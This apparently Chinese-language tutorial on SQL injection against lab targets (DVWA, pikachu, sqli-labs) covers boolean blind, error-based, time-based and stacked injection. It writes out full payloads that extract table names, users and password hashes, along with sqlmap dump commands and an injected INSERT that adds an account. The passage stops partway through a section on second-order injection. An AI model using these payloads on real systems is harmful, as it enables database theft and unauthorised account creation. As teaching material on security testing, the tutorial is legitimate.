布尔型忙注入查询长度</p><p>要查询当前库名，首先确定要查询数据库的长度，再通过截取字符进行对比。</p><p>1’ and if(length(database())&#x3D;4,1,0)–+</p><p>判断库名的长度为 4，截取第一个字符再进行判断</p><p>0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.@_</p><p>每次都要与这些字符进行判断。最后得到 d</p><p>1’ and if(substring(database(),1,1)&#x3D;’d’,1,0)–+</p><p>a &#x3D; “0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.@_”</p><p>for x in a:</p><p>print(x)</p><p>.抓包发送到测试模块 选择 Cluster boomb 模式 设置两个变量。<br>使用 Burp Suite 进行布尔盲注攻击是一种常见的 Web 安全测试手段。布尔盲注的核心在于通过页面的真假响应来判断注入条件是否成立，从而逐步提取信息。以下是详细的步骤和方法：</p><h3 id="1-配置-Burp-Suite-和测试环境"><a href="#1-配置-Burp-Suite-和测试环境" class="headerlink" title="1. 配置 Burp Suite 和测试环境"></a>1. <strong>配置 Burp Suite 和测试环境</strong></h3><ol><li><strong>启动 Burp Suite</strong>：打开 Burp Suite 并进入 Proxy 工具，确保拦截状态为关闭（Intercept is off）。</li><li><strong>设置代理</strong>：确保目标应用程序的流量通过 Burp Suite 的代理发送。通常需要设置浏览器或其他 HTTP 客户端的代理，指向运行 Burp Suite 的机器 IP 地址及默认监听端口（通常是 8080）。</li></ol><h3 id="2-发现注入点"><a href="#2-发现注入点" class="headerlink" title="2. 发现注入点"></a>2. <strong>发现注入点</strong></h3><ol><li><strong>识别潜在注入点</strong>：找到应用程序中可能存在的 SQL 注入漏洞位置，如查询字符串参数、POST 数据字段或 Cookie。</li><li><strong>测试布尔盲注</strong>：<ul><li>构造两个测试语句：<ul><li><code>id=1&#39; AND 1=1 --</code>：如果页面正常加载，说明注入点存在。</li><li><code>id=1&#39; AND 1=2 --</code>：如果页面显示错误或加载失败，说明注入点存在。</li></ul></li></ul></li></ol><h3 id="3-构造有效载荷"><a href="#3-构造有效载荷" class="headerlink" title="3. 构造有效载荷"></a>3. <strong>构造有效载荷</strong></h3><ol><li><strong>确定数据库名长度</strong>：<ul><li>构造如下语句：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND LENGTH(database())&gt;10 --</span></span><br></pre></td></tr></table></figure></li><li>使用 Burp Suite 的 Intruder 模块，设置 Payload 类型为数字，从 1 开始递增，直到页面响应发生变化。</li></ul></li><li><strong>逐字符爆破数据库名</strong>：<ul><li>构造如下语句：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND SUBSTRING(database(), 1, 1)=&#x27;</span>k<span class="string">&#x27; --</span></span><br></pre></td></tr></table></figure></li><li>使用 Burp Suite 的 Intruder 模块，设置 Payload 类型为字符，从 a-z、A-Z、0-9 等字符中逐个尝试。</li></ul></li></ol><h3 id="4-自动化爆破过程"><a href="#4-自动化爆破过程" class="headerlink" title="4. 自动化爆破过程"></a>4. <strong>自动化爆破过程</strong></h3><ol><li><strong>使用 Intruder 模块</strong>：<ul><li>将需要爆破的参数标记为变量。</li><li>选择合适的 Payload 类型（如数字或字符）。</li><li>设置 Payload 的范围（如字符范围或数字范围）。</li><li>启动攻击，观察页面响应的变化。</li></ul></li><li><strong>分析结果</strong>：<ul><li>通过响应的变化（如页面是否加载成功）来判断注入条件是否成立。</li><li>根据结果逐步提取数据库名、表名、列名等信息。</li></ul></li></ol><h3 id="5-示例-2"><a href="#5-示例-2" class="headerlink" title="5. 示例"></a>5. <strong>示例</strong></h3><p>假设目标 URL 是 <code>http://example.com/?id=1</code>，目标是提取数据库名：</p><ol><li><strong>确定数据库名长度</strong>：<ul><li>构造语句：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>example.com<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND LENGTH(database())&gt;10 --</span></span><br></pre></td></tr></table></figure></li><li>使用 Burp Suite 的 Intruder 模块，设置 Payload 类型为数字，从 1 开始递增，直到页面响应发生变化。</li></ul></li><li><strong>逐字符爆破数据库名</strong>：<ul><li>构造语句：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>example.com<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND SUBSTRING(database(), 1, 1)=&#x27;</span>k<span class="string">&#x27; --</span></span><br></pre></td></tr></table></figure></li><li>使用 Burp Suite 的 Intruder 模块，设置 Payload 类型为字符，从 a-z、A-Z、0-9 等字符中逐个尝试。</li></ul></li></ol><p>变量 1 获取设置长度为 4 ，变量 2 设置导入字典 payload.txt 提交攻击。</p><p>拼接字符得到 dvwa 库名</p><p>得到库名接着获取表名</p><p>1’and if(substring((select TABLE_NAME from information_schema.TABLES where</p><p>TABLE_SCHEMA&#x3D;database() limit 1),1,1)&#x3D;’g’,1,0)–+</p><p>抓包设置分别设置单个变量</p><p>开启攻击获取表名 guestbook users</p><p>得到表名之后 获取字段名 在用 burpsuite 抓包修改变量</p><p>1’and if(substring((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME&#x3D;’users’</p><p>limit 1,1),1,1)&#x3D;’u’,1,0)–+</p><p>当前库的表的第一个列字符是否等于 u 如果等于 u 返回正则页面 否则返回错误页面。</p><p>select * from users where user_id&#x3D;1 and if(substring((select COLUMN_NAME from</p><p>information_schema.COLUMNS where TABLE_NAME&#x3D;’users’ and TABLE_SCHEMA&#x3D;database() limit</p><p>0,1),1,1)&#x3D;’u’,1,0);</p><p>获取 users 表的字段</p><p>最后获取账号和密码</p><p>首先判断查询账号和密码的长度</p><p>1’and if((SELECT LENGTH(CONCAT(user,0x3a,PASSWORD)) from users limit 1)&#x3D;38,1,0)–+</p><p>使用 burpsuie 获取账号和密码</p><p>1’and if(substring((select CONCAT(user,0x3a,PASSWORD) from users limit 1),1,1)&#x3D;’a’,1,0)–+</p><p>burpsuite 抓包修改值 提交测试。</p><p>得到账号和密码</p><p>最后整理结果得出 admin:5f4dcc3b5aa765d61d8327deb882cf99</p><h1 id="1-7报错注入"><a href="#1-7报错注入" class="headerlink" title="1.7报错注入"></a>1.7报错注入</h1><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>数据库显错是指，数据库在执行时，遇到语法不对，会显示报错信息，例如语法错语句 <code>select 1&#39;</code>：</p><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">11064 </span>- You have an <span class="keyword">error</span> in your SQL syntax; check the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the right syntax <span class="keyword">to</span> use near <span class="comment">&#x27;&#x27;&#x27; at line 1</span></span><br></pre></td></tr></table></figure><p>程序开发期间需要告诉使用者某些报错信息，方便管理员进行调试，定位文件错误。特别是 PHP 在执行 SQL 语句时一般都会采用异常处理函数，捕获错误信息。在 PHP 中使用 <code>mysql_error()</code> 函数。如果 SQL 注入存在时，会有报错信息返回，可以采用报错注入。</p><h2 id="1-7-1-从代码中分析-SQL-报错注入"><a href="#1-7-1-从代码中分析-SQL-报错注入" class="headerlink" title="1.7.1 从代码中分析 SQL 报错注入"></a>1.7.1 从代码中分析 SQL 报错注入</h2><p>打开 DVWA 分析语句。如果语法错误，<code>msqli_error()</code>、<code>mysqli_connect_error()</code> 会将语法错误信息显示到页面上。</p><h2 id="1-7-2-SQL-报错注入攻击"><a href="#1-7-2-SQL-报错注入攻击" class="headerlink" title="1.7.2 SQL 报错注入攻击"></a>1.7.2 SQL 报错注入攻击</h2><p>判断是否存在报错注入：输入单引号，如果报错有可能存在报错注入。如果拼接 SQL 语句带入到 MySQL 执行，即存在报错注入。</p><p>输入 <code>1&#39;and info()--+</code> 显示当前库，原理是：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> info()<span class="comment">--</span></span><br></pre></td></tr></table></figure><p>会报错显示当前库不存在这个函数，这样当前库名就显示在页面上。</p><h2 id="1-7-3-报错注入获取数据库敏感信息"><a href="#1-7-3-报错注入获取数据库敏感信息" class="headerlink" title="1.7.3 报错注入获取数据库敏感信息"></a>1.7.3 报错注入获取数据库敏感信息</h2><p>输入构造的攻击语句，页面返回数据库信息：[[常用函数]]</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;and (updatexml(1,concat(0x7e,(select user()),0x7e),1))--</span></span><br></pre></td></tr></table></figure><p>把 <code>user()</code> 替换成其他的函数 <code>version()</code>、<code>database()</code> 就能得到 MySQL 的版本信息和当前库名。但是采用 <code>updatexml</code> 报错函数，只能显示 32 长度的内容，如果获取的内容超过 32 字符就要采用字符串截取方法。每次获取 32 个字符串的长度。</p><p>除了 <code>updatexml</code> 函数支持报错注入外，MySQL 还有很多函数支持报错：</p><ol><li><p><code>floor()</code></p> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="keyword">user</span>(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);</span><br></pre></td></tr></table></figure></li><li><p><code>extractvalue()</code></p> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)));</span><br></pre></td></tr></table></figure></li><li><p><code>updatexml()</code></p> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br></pre></td></tr></table></figure></li><li><p><code>geometrycollection()</code></p> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> geometrycollection((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure></li><li><p><code>multipoint()</code></p> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipoint((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure></li><li><p><code>polygon()</code></p> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure></li><li><p><code>multipolygon()</code></p> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipolygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure></li><li><p><code>linestring()</code></p> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> linestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure></li><li><p><code>multilinestring()</code></p> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multilinestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure></li><li><p><code>exp()</code></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a));</span><br></pre></td></tr></table></figure></li></ol><h2 id="1-7-4-在黑盒模式下的报错注入"><a href="#1-7-4-在黑盒模式下的报错注入" class="headerlink" title="1.7.4 在黑盒模式下的报错注入"></a>1.7.4 在黑盒模式下的报错注入</h2><p>在黑盒模式下的报错注入，首先获取当前库，通过库获取表名，接着通过表名获取字段，最后获取字段内容。</p><h3 id="1-7-5-报错注入得到库名"><a href="#1-7-5-报错注入得到库名" class="headerlink" title="1.7.5 报错注入得到库名"></a>1.7.5 报错注入得到库名</h3><p>注入以后语句均可获取库名：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and info()--</span></span><br><span class="line"><span class="string">1&#x27;</span><span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="comment">--</span></span><br></pre></td></tr></table></figure><p>得到库名 <code>dvwa</code>。</p><h3 id="1-7-6报错注入获取-MySQL-账号和密码"><a href="#1-7-6报错注入获取-MySQL-账号和密码" class="headerlink" title="1.7.6报错注入获取 MySQL 账号和密码"></a>1.7.6报错注入获取 MySQL 账号和密码</h3><p>获取账号和密码需要 root 用户才有足够大的权限：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> authentication_string <span class="keyword">from</span> mysql.user limit <span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> (<span class="keyword">select</span> authentication_string <span class="keyword">from</span> mysql.user limit <span class="number">1</span> )),<span class="number">0x7e</span>),<span class="number">1</span>))</span><br><span class="line"><span class="keyword">select</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> (<span class="built_in">substring</span>((<span class="keyword">select</span> authentication_string <span class="keyword">from</span> mysql.user limit <span class="number">1</span>),<span class="number">32</span>,<span class="number">40</span>))),<span class="number">0x7e</span>),<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h3 id="1-7-7报错注入获取表名"><a href="#1-7-7报错注入获取表名" class="headerlink" title="1.7.7报错注入获取表名"></a>1.7.7报错注入获取表名</h3><p>通过 MySQL 内置库 <code>information_schema</code>，通过构造 SQL 语句查询获取表名。采用 <code>floor</code> 报错并不会存在长度问题。</p><p>查询第一个表名：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span></span><br></pre></td></tr></table></figure><p>将 <code>LIMIT 0,1</code> 改成 <code>1,1</code>，表是第二个表名：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span></span><br></pre></td></tr></table></figure><h3 id="1-7-8-报错注入获取字段"><a href="#1-7-8-报错注入获取字段" class="headerlink" title="1.7.8 报错注入获取字段"></a>1.7.8 报错注入获取字段</h3><p>在获取表名之后就可以获取字段名，如获取 <code>users</code> 的字段名。</p><p>获取第一个字段名：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span></span><br></pre></td></tr></table></figure><p>获取第二个字段名：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span></span><br></pre></td></tr></table></figure><p>可以使用 Burp Suite 批量对字段批量获取，首先抓包，修改变量，设置匹配规则。开启攻击。</p><h3 id="1-7-9-报错注入获取某表某段内容"><a href="#1-7-9-报错注入获取某表某段内容" class="headerlink" title="1.7.9 报错注入获取某表某段内容"></a>1.7.9 报错注入获取某表某段内容</h3><p>现在已经获取 <code>users</code> 表的名字和它的字段名，接下来可以对内容进行查询：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,user,0x3a,password,0x23) FROM users limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span></span><br></pre></td></tr></table></figure><p>如果存在多个用户，把 <code>limit 0,1</code> 改成 <code>1,1</code>，如此类推直到获取最后一个用户为止。使用 Burpsuite 对用户获取，设置数量，再设置过滤网页响应内容。</p><p>获取库里 <code>users</code> 表所有用户的账号和密码。</p><h1 id="1-8-时间注入"><a href="#1-8-时间注入" class="headerlink" title="1.8 时间注入"></a>1.8 时间注入</h1><h2 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h2><p>时间注入又名延时注入，属于盲注入的一种，通常是某个注入点无法通过布尔型注入获取数据而采用的一种突破注入的技巧。</p><p>在 MySQL 里，函数 <code>sleep()</code> 是延时的意思，<code>sleep(10)</code> 就是数据库延时 10 秒返回内容。判断注入可以使用 <code>&#39;and sleep(10)</code>，数据库延时 10 秒返回值，网页响应时间至少要 10 秒。根据这个原理来判断存在 SQL 时间注入。</p><p>MySQL 延时注入用到的函数有 <code>sleep()</code>、<code>if()</code>、<code>substring()</code>。例如：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> IF(<span class="number">2</span><span class="operator">&gt;</span><span class="number">1</span>, SLEEP(<span class="number">10</span>), <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p><code>2&gt;1</code> 这个部分就是你注入要构造的 SQL 语句。如果条件成立，就会触发延时。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> IF(LENGTH(database())<span class="operator">&gt;</span><span class="number">1</span>, SLEEP(<span class="number">5</span>), <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>这个语句用于查询当前库名长度是否大于 1，如果是，就会延时 5 秒执行。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; OR IF(LENGTH(database())&gt;1, SLEEP(5), 0)--+</span></span><br></pre></td></tr></table></figure><p>可以看到网页响应时间大于五秒，根据这个原理，如果 <code>n&gt;1</code>，<code>n</code> 不延时就能确定当前数据库的长度了。</p><p>如果想要获取数据内容，可以用截取字符再进行字符对比，如果相同就进行延时。这样就能逐个获取字符，接着再拼接就是当前库的内容。</p><p><strong>注意</strong>：由于网络原因，我无法成功解析以下链接。如果需要该网页的具体内容，请检查链接的合法性，并适当重试。</p><ul><li><a href="http://192.168.0.134/06/vul/sqli/sqli_blind_t.php?name=1&submit=%E6%9F%A5%E8%AF%A2">http://192.168.0.134/06/vul/sqli/sqli_blind_t.php?name&#x3D;1&amp;submit&#x3D;%E6%9F%A5%E8%AF%A2</a></li></ul><hr><h2 id="1-19-2-时间注入代码分析"><a href="#1-19-2-时间注入代码分析" class="headerlink" title="1.19.2 时间注入代码分析"></a>1.19.2 时间注入代码分析</h2><p>在页面中分析源码，直接获取 <code>name</code> 带进数据库进行查询，但是否存在记录，页面返回都一样。在黑盒模式下可以使用 sqlmap 对注入进行检测。sqlmap 支持多种数据库注入，而且支持多种注入方式。</p><h3 id="采用时间注入"><a href="#采用时间注入" class="headerlink" title="采用时间注入"></a>采用时间注入</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.0.134/06/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> -p name -v 1 --technique=T</span><br></pre></td></tr></table></figure><ul><li><code>-u</code>：表示检测的 URL。</li><li><code>-p</code>：指定检测的参数。</li><li><code>-v</code>：显示调试模式。</li><li><code>--technique=T</code>：检测方法为时间注入。</li></ul><p>sqlmap 检测为时间注入后，接下来可以通过这个注入获取数据库的名、用户权限、表、字段等敏感信息的获取。</p><h3 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.0.134/06/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> -p name -v 1 --technique=T --current-user --current-db --batch</span><br></pre></td></tr></table></figure><ul><li><code>--current-user</code>：获取当前用户。</li><li><code>--current-db</code>：获取当前数据库。</li><li><code>--batch</code>：使用默认模式，自动回答 <code>y</code>。</li></ul><h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.0.134/06/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> -p name -v 1 --technique=T --tables -D pikachu --batch</span><br></pre></td></tr></table></figure><ul><li><code>-D</code>：指定数据库。</li><li><code>--tables</code>：获取表名。</li></ul><h3 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.0.134/06/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> -p name -v 1 --technique=T --columns -T <span class="built_in">users</span> -D pikachu --batch</span><br></pre></td></tr></table></figure><ul><li><code>-T</code>：指定表名。</li><li><code>--columns</code>：获取字段名。</li></ul><h3 id="查询账号和密码"><a href="#查询账号和密码" class="headerlink" title="查询账号和密码"></a>查询账号和密码</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.0.134/06/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> -p name -v 1 --technique=T --dump -C <span class="string">&quot;id,username,password&quot;</span> -T <span class="built_in">users</span> -D pikachu --batch</span><br></pre></td></tr></table></figure><ul><li><code>--dump</code>：导出数据。</li><li><code>-C</code>：指定查询的字段。</li></ul><p>使用 sqlmap 可以很容易地将时间注入的数据查询出来。</p><h1 id="1-9-堆叠注入"><a href="#1-9-堆叠注入" class="headerlink" title="1.9 堆叠注入"></a>1.9 堆叠注入</h1><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>堆叠查询：堆叠查询可以执行多条 SQL 语句，语句之间以分号（<code>;</code>）隔开，而堆叠查询注入攻击就是利用此特点，在第二条语句中构造要执行攻击的语句。</p><p>在 MySQL 里，<code>mysqli_multi_query</code> 和 <code>mysql_multi_query</code> 这两个函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> version(); <span class="keyword">SELECT</span> database()</span><br></pre></td></tr></table></figure><p>堆叠注入的危害是很大的，可以任意使用增删改查的语句，例如删除数据库、修改数据库、添加数据库用户。</p><h2 id="1-19-4-堆叠注入代码分析"><a href="#1-19-4-堆叠注入代码分析" class="headerlink" title="1.19.4 堆叠注入代码分析"></a>1.19.4 堆叠注入代码分析</h2><p>靶场启动：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker run -dt --name sqli -p 7766:80 acgpiano/sqli-labs</span><br></pre></td></tr></table></figure><p>在堆叠注入页面中，程序获取 <code>GET</code> 参数的 <code>id</code>，使用 <code>mysqli</code> 的方式进行数据查询，在执行语句时使用了 <code>mysqli_multi_query</code> 函数处理 SQL 语句，导致存在堆叠注入。</p><p>进入 Docker 容器：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker <span class="built_in">exec</span> -ti sqli /bin/bash</span><br></pre></td></tr></table></figure><h2 id="1-9-5-堆叠注入的利用"><a href="#1-9-5-堆叠注入的利用" class="headerlink" title="1.9.5 堆叠注入的利用"></a>1.9.5 堆叠注入的利用</h2><p>使用以下语句先确定是否存在注入：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND 1=2--+ </span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>接着使用堆叠语法进行检测：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-999</span><span class="string">&#x27; UNION SELECT 1,2,(SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=database() LIMIT 1)--+</span></span><br></pre></td></tr></table></figure><p>把库里的所有表获取出来，再获取字段：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-999</span><span class="string">&#x27; UNION SELECT 1,2,(SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME=&#x27;</span>users<span class="string">&#x27; LIMIT 1)--+</span></span><br></pre></td></tr></table></figure><p>知道表的列的情况下，使用 <code>INSERT INTO</code> 插入语句进行增加账号。如果是管理表，直接添加管理员账号即可登录后台。</p><p>由于网络原因，我无法成功解析以下链接。如果需要该网页的具体内容，请检查链接的合法性，并适当重试。</p><ul><li><a href="http://192.168.0.145:7766/Less-38/?id=1%27">http://192.168.0.145:7766/Less-38/?id=1%27</a></li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-999</span><span class="string">&#x27;; INSERT INTO users(id,username,password) VALUES(1000,&#x27;</span>moonsec<span class="string">&#x27;,&#x27;</span><span class="number">123456</span><span class="string">&#x27;)--+</span></span><br></pre></td></tr></table></figure><p>访问 <code>1000</code> 即可访问到刚刚添加的账号。</p><h1 id="1-10-二次注入"><a href="#1-10-二次注入" class="headerlink" title="1.10 二次注入"></a>1.10 二次注入</h1><h2 id="二次注入攻击"><a href="#二次注入攻击" class="headerlink" title="二次注入攻击"></a>二次注入攻击</h2><p>二次注入漏洞是一种在 Web 应用程序中广泛存在的安全漏洞形式。相对于一次注入漏洞而言，二次注入漏洞更难以被发现，但它却具有与一次注入攻击漏洞相同的攻击威力。</p><h2 id="二次注入原理"><a href="#二次注入原理" class="headerlink" title="二次注入原理"></a>二次注入原理</h2><p>二次注入的原理是，在第一次进行数据库插入数据时，仅仅只是使用了 <code>addslashes</code> 或者是借助 <code>get_magic_quotes_gpc</code> 对其中的特殊字符进行了转义。但是 <code>addslashes</code> 有一个特点，虽然参数在过滤后会添加 <code>\</code> 进行转义，但 <code>\</code> 